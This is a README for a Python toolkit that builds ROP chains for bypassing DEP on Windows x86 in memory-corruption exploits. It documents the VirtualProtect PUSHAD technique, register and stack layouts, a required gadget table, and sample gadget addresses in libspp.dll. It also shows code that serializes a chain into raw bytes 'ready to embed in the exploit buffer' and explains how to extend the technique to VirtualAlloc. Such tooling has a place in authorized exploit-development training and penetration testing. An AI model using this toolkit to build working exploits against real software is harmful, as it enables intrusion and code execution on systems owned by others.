# Tools/rop — ROP Chain Toolkit

Symbolic ROP chain planning, validation, and serialization for Windows x86
DEP bypass.  Gadget addresses are **never** generated or guessed — every
address must come from a user-supplied JSON file.

## Module layout

```
Tools/rop/
├── __init__.py          public API re-exports
├── models.py            ChainElement types, Gadget, ValidationIssue
├── gadget_db.py         GadgetDB — JSON loading and name→Gadget lookup
├── chain.py             RopChain (generic builder), VirtualProtectChain (planner)
├── validator.py         ChainValidator — six independent validation checks
├── serializer.py        ChainSerializer — symbolic → raw bytes
├── printer.py           DryRunPrinter — annotated dry-run table
├── examples/
│   └── virtualprotect_gadgets.json   template (fill in real addresses)
└── tests/
    └── test_rop.py      81 unit tests (all with fake addresses)
```

## Quick start

### 1. Create a gadget database

Copy `examples/virtualprotect_gadgets.json`, then replace every `"0xTODO"`
with a real address found by `mona.py`, `rp++`, or a WinDbg script:

```json
{
  "pop_edi_ret":        { "address": "0x1002f529", "module": "libspp.dll", "instruction": "pop edi; ret" },
  "ptr_to_ret":         { "address": "0x10014fcd", "module": "libspp.dll", "instruction": "ret" },
  "pop_esi_ret":        { "address": "0x1001f5f2", "module": "libspp.dll", "instruction": "pop esi; ret" },
  "virtualprotect_ptr": { "address": "0x1060e060", "module": "libspp.dll (IAT)", "instruction": "ptr to VirtualProtect" },
  ...
}
```

### 2. Plan the chain

```python
from Tools.rop import GadgetDB, VirtualProtectChain

db    = GadgetDB.from_file("gadgets.json")
vp    = VirtualProtectChain(shellcode_size=0x201)
chain = vp.plan()          # list[ChainElement] — no addresses resolved yet
```

### 3. Validate

```python
from Tools.rop import ChainValidator

issues = ChainValidator().validate(chain, db, bad_chars=b"\x00\x0a\x0d")
for issue in issues:
    print(issue)
# [ERROR] [element 11] BAD_CHARS: raw dword 0x00000040 contains bad byte(s): 0x00
```

The `flNewProtect=0x40` raw dword will always flag when `0x00` is a bad
character.  The real fix is to build the constant at runtime with gadgets
(e.g. `xor eax,eax; add eax, 0x40`) — replace that `RawDword` with the
appropriate gadget sequence using `RopChain`.

### 4. Dry run

```python
from Tools.rop import DryRunPrinter

DryRunPrinter().print_chain(chain, db, bad_chars=b"\x00\x0a\x0d")
```

```
 IDX   OFFSET  TYPE                    VALUE  SOURCE                            PURPOSE
----------------------------------------------------------------------------------------------------
[00]  +0x000  gadget_ref          0x1002f529  pop_edi_ret @ libspp.dll          load skeleton-ret pointer into EDI
[01]  +0x004  gadget_ref          0x10014fcd  ptr_to_ret @ libspp.dll           EDI ← address of any ret instruction (PUSHAD trampoline)
[02]  +0x008  gadget_ref          0x1001f5f2  pop_esi_ret @ libspp.dll          load VirtualProtect address into ESI
[03]  +0x00c  gadget_ref          0x1060e060  virtualprotect_ptr @ libspp.dll   ESI ← VirtualProtect (IAT entry or resolved function)
...
[17]  +0x044  shellcode_ptr        <dynamic>  (runtime)                         shellcode base — pre-PUSHAD ESP == lpAddress
----------------------------------------------------------------------------------------------------
Total: 18 dwords, 72 bytes
```

Missing gadgets or bad-byte hits are printed in red on colour terminals.

### 5. Serialize

```python
from Tools.rop import ChainSerializer

raw = ChainSerializer().serialize(chain, db, shellcode_addr=0x00419000)
# raw is bytes, ready to embed in the exploit buffer
```

---

## VirtualProtect PUSHAD chain

The planner uses the **PUSHAD register-setup** technique:

```
Before PUSHAD:
  EDI = ptr_to_ret        ← skeleton ret (PUSHAD trampoline)
  ESI = VirtualProtect    ← called via two rets after PUSHAD
  EBP = jmp_esp gadget    ← VirtualProtect's return address
  EBX = shellcode_size    ← dwSize (built null-free via neg trick)
  EDX = 0x40              ← flNewProtect = PAGE_EXECUTE_READWRITE
  ECX = writable_ptr      ← lpflOldProtect
  EAX = 0x90909090        ← NOP sled filler

After PUSHAD the stack looks like:
  [ESP+00] EDI  ← ret pops this → lands on ESI (VirtualProtect)
  [ESP+04] ESI  ← VirtualProtect address
  [ESP+08] EBP  ← return address (jmp esp)
  [ESP+0C] old-ESP  ← lpAddress (== shellcode base)
  [ESP+10] EBX  ← dwSize
  [ESP+14] EDX  ← flNewProtect
  [ESP+18] ECX  ← lpflOldProtect
  [ESP+1C] EAX  ← NOP / alignment
```

After VirtualProtect returns, `jmp esp` jumps into the now-executable
shellcode region.  Prepend the shellcode with a short NOP sled (`\x90 * 16`)
to absorb the few-byte offset from PUSHAD frame cleanup.

### Required gadget DB keys

| Key | Instruction |
|-----|-------------|
| `pop_edi_ret` | `pop edi; ret` |
| `ptr_to_ret` | any `ret` instruction |
| `pop_esi_ret` | `pop esi; ret` |
| `virtualprotect_ptr` | IAT entry or resolved VirtualProtect address |
| `pop_ebp_ret` | `pop ebp; ret` |
| `jmp_esp` | `jmp esp` |
| `pop_eax_ret` | `pop eax; ret` *(used twice)* |
| `neg_eax_ret` | `neg eax; ret` |
| `xchg_eax_ebx_ret` | `xchg eax, ebx; ret` |
| `pop_edx_ret` | `pop edx; ret` |
| `pop_ecx_ret` | `pop ecx; ret` |
| `pushad_ret` | `pushad; ret` |
| `writable_ptr` | any static writable dword |

---

## Generic chain builder

For custom or VirtualAlloc chains, use `RopChain` directly:

```python
from Tools.rop import RopChain, GadgetDB, ChainValidator, ChainSerializer

db = GadgetDB.from_file("gadgets.json")

chain = (
    RopChain()
    .push_gadget("pop_eax_ret",  "load EAX")
    .push_dword(0x41414141,      "placeholder — patch before send")
    .push_gadget("pop_ecx_ret",  "load ECX")
    .push_writable("writable_ptr", "writable slot")
    .push_gadget("pushad_ret",   "trigger")
    .push_shellcode_ptr("shellcode base")
)

issues = ChainValidator().validate(chain.elements(), db, bad_chars=b"\x00")
raw    = ChainSerializer().serialize(chain.elements(), db, shellcode_addr=0x00419000)
```

---

## Validation checks

| Code | Severity | Description |
|------|----------|-------------|
| `MISSING_GADGET` | error | GadgetRef or WritablePtr name not in DB |
| `BAD_CHARS` | error | Packed value contains a forbidden byte |
| `ZERO_PADDING` | error | PaddingBlock with count=0 |
| `NO_WRITABLE_PTR` | error | No WritablePtr in chain (lpflOldProtect missing) |
| `NO_RETURN_TARGET` | warning | No ShellcodePtr or jmp-* gadget in chain |
| `STACK_ALIGNMENT` | warning | Chain length is not 16-byte aligned |

---

## Extending for VirtualAlloc

`VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)` has the same
argument count as VirtualProtect.  The PUSHAD register mapping changes:

| Register | VirtualProtect | VirtualAlloc |
|----------|---------------|--------------|
| ESI | VirtualProtect ptr | VirtualAlloc ptr |
| EBP | jmp esp | return to shellcode |
| old-ESP | lpAddress (shellcode) | lpAddress (NULL = OS picks) |
| EBX | dwSize | dwSize |
| EDX | flNewProtect (0x40) | flProtect (0x40) |
| ECX | lpflOldProtect (writable) | flAllocationType (MEM_COMMIT\|MEM_RESERVE = 0x3000) |

Build a `VirtualAllocChain` subclass following the same pattern as
`VirtualProtectChain.plan()`.

---

## Running tests

```bash
uv run pytest Tools/rop/tests/test_rop.py -v
```
